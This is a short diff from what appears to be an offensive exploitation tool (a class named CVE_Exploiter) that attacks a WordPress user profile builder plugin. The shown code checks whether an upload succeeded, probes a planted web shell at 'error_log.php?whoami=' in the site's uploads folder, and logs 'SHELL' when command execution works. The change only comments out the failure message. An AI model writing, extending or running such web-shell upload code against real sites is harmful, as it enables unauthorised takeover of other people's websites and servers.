@@ -643,8 +643,8 @@ class CVE_Exploiter:
                         if 'url' and 'filename' and 'editLink' in str(REZ_PROFILEBUILDER['resp'].text):
                             if Core_Helper.Func_ValidShell(self.SET_Timeout, self.Proxies_ON, f'{self.TARGET}/wp-content/uploads/{datetime.now().year}/{datetime.now().strftime('%m')}"/error_log.php?whoami=@1337', self.Config_UA): 
                                 Core_Helper.Printed_Value.Log_Success(REZ_PROFILEBUILDER['domain'], f'[WP] UserProfile_Builder | Weclome SHELL') 
-                        else:
-                            Core_Helper.Printed_Value.Log_Success(REZ_PROFILEBUILDER['domain'], f'[WP] UserProfile_Builder | Failed SHELL') 
+                        # else:
+                        #     Core_Helper.Printed_Value.Log_Success(REZ_PROFILEBUILDER['domain'], f'[WP] UserProfile_Builder | Failed SHELL') 
                     else:
                         Core_Helper.Printed_Value.Log_Fail(REZ_PROFILEBUILDER['domain'], f"[WP] UserProfile_Builder | Failed") 
                 else:
